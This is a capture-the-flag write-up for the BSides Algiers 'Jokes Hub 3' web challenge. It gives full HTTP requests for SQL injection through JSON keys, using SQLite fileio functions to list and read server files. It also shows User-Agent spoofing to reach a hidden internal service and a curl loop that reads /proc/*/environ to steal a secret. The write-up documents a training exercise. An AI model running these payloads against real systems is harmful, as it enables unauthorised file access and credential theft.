#  Jokes Hub 3


## Description

> I wanted you to laugh but you keep messing with my system, you are on your own now.

## Write-Up

Remember the files tree we got from previous challenge :

 - Active Directory :
   - .
   - ..
   - ./wsgi.py
   - ./jokes.txt
   - ./app.py
   - ./app.ini
   - ./requirements.txt
   - ./db.py
   - ./fileio.so
   - ./static
   - ./templates
   - ./notes.txt
 - Parent Directory :
   - ../flagger
   - ../flagger/wsgi.py
   - ../flagger/flagger.py
   - ../flagger/flagger.ini

And the `../flagger/flagger.py` filecontains the following :

```
HTTP/1.1 200 OK
server: nginx/1.22.0 (Ubuntu)
date: Sat, 06 May 2023 08:32:30 GMT
content-type: application/json
content-length: 550
connection: close

{"result":"from flask import Flask, request\nimport os\n\n#shellmates{it5_l1k3_5q1i73_0n_573r01d5}\n\nflagger = Flask(__name__)\n\nSECRET = os.getenv(\"SECRET\")\n\n@flagger.route('/getFlag/<secret>', methods=['GET'])\ndef getFlag(secret):\n    if secret == SECRET:\n        return os.popen(\"/flag\").read()\n    return \"Wrong secret\"\n\n@flagger.route('/fileReader/', methods=['GET'])\ndef getFile():\n    file = request.args.get(\"file\",\"\")\n    if os.path.exists(file):\n        return open(file).read()\n    return \"File doesn't exist\""}
```

Let's dive deeper in the application :

First, we can see that the server uses nginx, so there is a `nginx.conf` somewhere (which we missed last time) :

```
POST /jokes HTTP/1.1
Host: jokes-hub-1.bsides.shellmates.club
Content-Length: 55
...
Accept-Language: en-US,en;q=0.9
Connection: close

{"name from fileio_ls('..') LIMIT 200 OFFSET 3;--":100}
```

```
HTTP/1.1 200 OK
server: nginx/1.22.0 (Ubuntu)
date: Sat, 06 May 2023 08:47:20 GMT
content-type: application/json
content-length: 27
connection: close

{"result":"../nginx.conf"}
```

Let's read it's content :

```
POST /jokes HTTP/1.1
Host: jokes-hub-1.bsides.shellmates.club
...
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"CAST(fileio_read('../nginx.conf') AS TEXT ENCODING 'utf-8');--":100}
```

We get :

```
HTTP/1.1 200 OK
server: nginx/1.22.0 (Ubuntu)
date: Sat, 06 May 2023 08:49:07 GMT
content-type: application/json
content-length: 908
connection: close

{"result":"error_log /tmp/error.log;\npid       /tmp/nginx.pid;\n\nevents {\n}\n\nhttp {\n  upstream flask {\n      # /ctf/app/app.py\n      server unix:/tmp/app.sock;\n  }\n\n    upstream flagger {\n      # /ctf/flagger/flagger.py\n      server unix:/tmp/flagger.sock;\n  }\n\n    map $http_user_agent $redirect {\n    default flask;\n    \"flagger-user\" flagger;\n  }\n\n  server {\n    listen       8000;\n    client_max_body_size 10m;\n\n    access_log /tmp/nginx_host.access.log;\n    client_body_temp_path /tmp/client_body;\n    fastcgi_temp_path /tmp/fastcgi_temp;\n    proxy_temp_path /tmp/proxy_temp;\n    scgi_temp_path /tmp/scgi_temp;\n    uwsgi_temp_path /tmp/uwsgi_temp;\n\n\n    location / {\n\tinclude /etc/nginx/uwsgi_params;\n    if ($redirect = \"flagger\") {\n        uwsgi_pass flagger;\n      }\n\tuwsgi_pass flask;\n    }\n\n    location = /alive {\n\treturn 200;\n    }\n\n  }\n}\n"}
```

More cleaner version for `nginx.conf` :

```nginx
"error_log /tmp/error.log;
pid       /tmp/nginx.pid;

events {
}

http {
  upstream flask {
      # /ctf/app/app.py
      server unix:/tmp/app.sock;
  }

    upstream flagger {
      # /ctf/flagger/flagger.py
      server unix:/tmp/flagger.sock;
  }

    map $http_user_agent $redirect {
    default flask;
    \"flagger-user\" flagger;
  }

  server {
    listen       8000;
    client_max_body_size 10m;

    access_log /tmp/nginx_host.access.log;
    client_body_temp_path /tmp/client_body;
    fastcgi_temp_path /tmp/fastcgi_temp;
    proxy_temp_path /tmp/proxy_temp;
    scgi_temp_path /tmp/scgi_temp;
    uwsgi_temp_path /tmp/uwsgi_temp;


    location / {
        include /etc/nginx/uwsgi_params;
    if ($redirect = \"flagger\") {
        uwsgi_pass flagger;
      }
        uwsgi_pass flask;
    }

    location = /alive {
        return 200;
    }

  }
}
"
```

And `flagger.py` :

```py
from flask import Flask, request
import os

flagger = Flask(__name__)

SECRET = os.getenv(\"SECRET\")

@flagger.route('/getFlag/<secret>', methods=['GET'])
def getFlag(secret):
         if secret == SECRET:
                  return os.popen(\"/flag\").read()
                      return \"Wrong secret\"
                      
@flagger.route('/fileReader/', methods=['GET'])
def getFile():
     file = request.args.get(\"file\",\"\")
          if os.path.exists(file):
                    return open(file).read()
                         return \"File doesn't exist\"
```

Let' concentrate on the `nginx.conf` :

 - We can see that two apps are running, `flask` and `flagger` :

```
upstream flask {
      # /ctf/app/app.py
      server unix:/tmp/app.sock;
  }

    upstream flagger {
      # /ctf/flagger/flagger.py
      server unix:/tmp/flagger.sock;
  }
```

 - We can check also `/etc/nginx/uwsgi_params` :

```
HTTP/1.1 200 OK
server: nginx/1.22.0 (Ubuntu)
date: Sat, 06 May 2023 09:01:27 GMT
content-type: application/json
content-length: 695
connection: close

{"result":"\nuwsgi_param  QUERY_STRING       $query_string;\nuwsgi_param  REQUEST_METHOD     $request_method;\nuwsgi_param  CONTENT_TYPE       $content_type;\nuwsgi_param  CONTENT_LENGTH     $content_length;\n\nuwsgi_param  REQUEST_URI        $request_uri;\nuwsgi_param  PATH_INFO          $document_uri;\nuwsgi_param  DOCUMENT_ROOT      $document_root;\nuwsgi_param  SERVER_PROTOCOL    $server_protocol;\nuwsgi_param  REQUEST_SCHEME     $scheme;\nuwsgi_param  HTTPS              $https if_not_empty;\n\nuwsgi_param  REMOTE_ADDR        $remote_addr;\nuwsgi_param  REMOTE_PORT        $remote_port;\nuwsgi_param  SERVER_PORT        $server_port;\nuwsgi_param  SERVER_NAME        $server_name;\n"}
```

Better format :

```
uwsgi_param  QUERY_STRING       $query_string;
uwsgi_param  REQUEST_METHOD     $request_method;
uwsgi_param  CONTENT_TYPE       $content_type;
uwsgi_param  CONTENT_LENGTH     $content_length;

uwsgi_param  REQUEST_URI        $request_uri;
uwsgi_param  PATH_INFO          $document_uri;
uwsgi_param  DOCUMENT_ROOT      $document_root;
uwsgi_param  SERVER_PROTOCOL    $server_protocol;
uwsgi_param  REQUEST_SCHEME     $scheme;
uwsgi_param  HTTPS              $https if_not_empty;

uwsgi_param  REMOTE_ADDR        $remote_addr;
uwsgi_param  REMOTE_PORT        $remote_port;
uwsgi_param  SERVER_PORT        $server_port;
uwsgi_param  SERVER_NAME        $server_name;
```

But this one is more interesting :

```
...
map $http_user_agent $redirect {
    default flask;
    \"flagger-user\" flagger;
  }
...
location / {
        include /etc/nginx/uwsgi_params;
    if ($redirect = \"flagger\") {
        uwsgi_pass flagger;
      }
        uwsgi_pass flask;
    }
```

This code is configuring an Nginx web server to proxy incoming requests to either a Flask application or a service named "flagger", depending on the value of the "User-Agent" HTTP header.

The map directive creates a mapping between the values of the "User-Agent" header and a custom variable named $redirect. In this case, the default value of $redirect is set to flask, which means that if the "User-Agent" header is not present or does not match any of the other defined values, the request will be proxied to the Flask application.

However, if the "User-Agent" header contains the string "flagger-user", the value of $redirect will be set to flagger, which means that the request will be proxied to a service named "flagger".

So, first, here is the standard request to the `/`, captured from burpsuite :

```
GET / HTTP/1.1
Host: jokes-hub-1.bsides.shellmates.club
Cache-Control: max-age=0
Sec-Ch-Ua: "Not;A=Brand";v="99", "Chromium";v="106"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

Now, let's modify user-agent :

```
...
User-Agent: flagger-user
...
```

Which redirects us to the flagger app, but we need to request a valid endpoint :

```
HTTP/1.1 404 NOT FOUND
server: nginx/1.22.0 (Ubuntu)
date: Sat, 06 May 2023 09:10:54 GMT
content-type: text/html; charset=utf-8
content-length: 207
connection: close

<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

From the `flagger.py`, there is a `/getFlag/<secret>` endpoint, by sending any secret, we get :

```
GET /getFlag/<secret> HTTP/1.1
Host: jokes-hub-1.bsides.shellmates.club
Cache-Control: max-age=0
Sec-Ch-Ua: "Not;A=Brand";v="99", "Chromium";v="106"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: flagger-user
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

```
HTTP/1.1 200 OK
server: nginx/1.22.0 (Ubuntu)
date: Sat, 06 May 2023 09:12:51 GMT
content-type: text/html; charset=utf-8
content-length: 12
connection: close

Wrong secret
```

Now, we need the secret. To do that, we need to check the environement variables.

Note : the flag is in `flag` :

```
POST /jokes HTTP/1.1
Host: jokes-hub-1.bsides.shellmates.club
Content-Length: 60
Sec-Ch-Ua: "Not;A=Brand";v="99", "Chromium";v="106"
Sec-Ch-Ua-Platform: "Linux"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://jokes-hub-1.bsides.shellmates.club
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://jokes-hub-1.bsides.shellmates.club/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"name from fileio_ls('/flag') LIMIT 200 OFFSET 0;--":100}
```

```
HTTP/1.1 200 OK
server: nginx/1.22.0 (Ubuntu)
date: Sat, 06 May 2023 09:25:30 GMT
content-type: application/json
content-length: 19
connection: close

{"result":"/flag"}
```

But, unfortunatly, we can't read it directly :

```
POST /jokes HTTP/1.1
Host: jokes-hub-1.bsides.shellmates.club
Content-Length: 64
Sec-Ch-Ua: "Not;A=Brand";v="99", "Chromium";v="106"
Sec-Ch-Ua-Platform: "Linux"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://jokes-hub-1.bsides.shellmates.club
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://jokes-hub-1.bsides.shellmates.club/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"CAST(fileio_read('/flag') AS TEXT ENCODING 'utf-8');--":100}
```

```
HTTP/1.1 200 OK
server: nginx/1.22.0 (Ubuntu)
date: Sat, 06 May 2023 09:26:27 GMT
content-type: application/json
content-length: 39
connection: close

{"result":"Couldn't retrieve results"}
```

Here are some test to get ENV vars :

```
POST /jokes HTTP/1.1
Host: jokes-hub-1.bsides.shellmates.club
Content-Length: 77
Sec-Ch-Ua: "Not;A=Brand";v="99", "Chromium";v="106"
Sec-Ch-Ua-Platform: "Linux"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://jokes-hub-1.bsides.shellmates.club
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://jokes-hub-1.bsides.shellmates.club/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"CAST(fileio_read('/proc/self/environ') AS TEXT ENCODING 'utf-8');--":100}
```

```
HTTP/1.1 200 OK
server: nginx/1.22.0 (Ubuntu)
date: Sat, 06 May 2023 09:29:20 GMT
content-type: application/json
content-length: 14
connection: close

{"result":""}
```

Also

```
POST /jokes HTTP/1.1
Host: jokes-hub-1.bsides.shellmates.club
Content-Length: 75
Sec-Ch-Ua: "Not;A=Brand";v="99", "Chromium";v="106"
Sec-Ch-Ua-Platform: "Linux"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://jokes-hub-1.bsides.shellmates.club
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://jokes-hub-1.bsides.shellmates.club/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"CAST(fileio_read('/etc/environment') AS TEXT ENCODING 'utf-8');--":100}
```

```
HTTP/1.1 200 OK
server: nginx/1.22.0 (Ubuntu)
date: Sat, 06 May 2023 09:30:20 GMT
content-type: application/json
content-length: 123
connection: close

{"result":"PATH=\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin\"\n"}
```

But the real thing is, the ENV vars are in `/proc/PID/environment`. Let's check the processes, which are after checking, the processes are from 58 to 64 offset.

```
POST /jokes HTTP/1.1
Host: jokes-hub-1.bsides.shellmates.club
Content-Length: 75
Sec-Ch-Ua: "Not;A=Brand";v="99", "Chromium";v="106"
Sec-Ch-Ua-Platform: "Linux"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://jokes-hub-1.bsides.shellmates.club
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://jokes-hub-1.bsides.shellmates.club/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"CAST(fileio_read('/proc/10/environ') AS TEXT ENCODING 'utf-8');--":100}
```

```
HTTP/1.1 200 OK
server: nginx/1.22.0 (Ubuntu)
date: Sat, 06 May 2023 09:48:16 GMT
content-type: application/json
content-length: 14
connection: close

{"result":""}
```

Apprerantly, reading using `fileio_read()` can't read the environ files. So, we use `/fileReader/` route from flagger.

First let's test it :

```
GET /fileReader/ HTTP/1.1
Host: jokes-hub-1.bsides.shellmates.club
Cache-Control: max-age=0
Sec-Ch-Ua: "Not;A=Brand";v="99", "Chromium";v="106"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: flagger-user
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

```
HTTP/1.1 200 OK
server: nginx/1.22.0 (Ubuntu)
date: Sat, 06 May 2023 09:50:53 GMT
content-type: text/html; charset=utf-8
content-length: 18
connection: close

File doesn't exist
```

Now let's give it some files to read :

```
┌──(rivench㉿kali)-[~/…/CTFs/BSides_Algiers_2k23/web/Jokes_Hub_3]
└─$ for i in {1..15}; do curl "https://jokes-hub-1.bsides.shellmates.club/fileReader/?file=/proc/$i/environ" --output proc$i -H "User-agent: flagger-user"; done   
```

```
└─$ cat proc12
KUBERNETES_SERVICE_PORT=443KUBERNETES_PORT=tcp://10.88.0.1:443HOSTNAME=jokes-hub-1-6c94866568-mc8qvHOME=/home/ctfKUBERNETES_PORT_443_TCP_ADDR=10.88.0.1PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binKUBERNETES_PORT_443_TCP_PORT=443KUBERNETES_PORT_443_TCP_PROTO=tcpSECRET=0fd3f5550fc3662c07bea5219abbc7fcadbda7d9KUBERNETES_SERVICE_PORT_HTTPS=443KUBERNETES_PORT_443_TCP=tcp://10.88.0.1:443KUBERNETES_SERVICE_HOST=10.88.0.1PWD=/ctf   
```

So the secret is : 0fd3f5550fc3662c07bea5219abbc7fcadbda7d9

From there, we get the flag :

```
GET /getFlag/0fd3f5550fc3662c07bea5219abbc7fcadbda7d9 HTTP/1.1
Host: jokes-hub-1.bsides.shellmates.club
Cache-Control: max-age=0
Sec-Ch-Ua: "Not;A=Brand";v="99", "Chromium";v="106"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: flagger-user
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Length: 17
```

```
HTTP/1.1 200 OK
server: nginx/1.22.0 (Ubuntu)
date: Sat, 06 May 2023 10:19:34 GMT
content-type: text/html; charset=utf-8
content-length: 59
connection: close

Shellmates{A_L0ng_waY-Fr0m_LAUGHING_AT_J0K3$_T0_My_SYSTEM}
```

## Flag

Shellmates{A_L0ng_waY-Fr0m_LAUGHING_AT_J0K3$_T0_My_SYSTEM}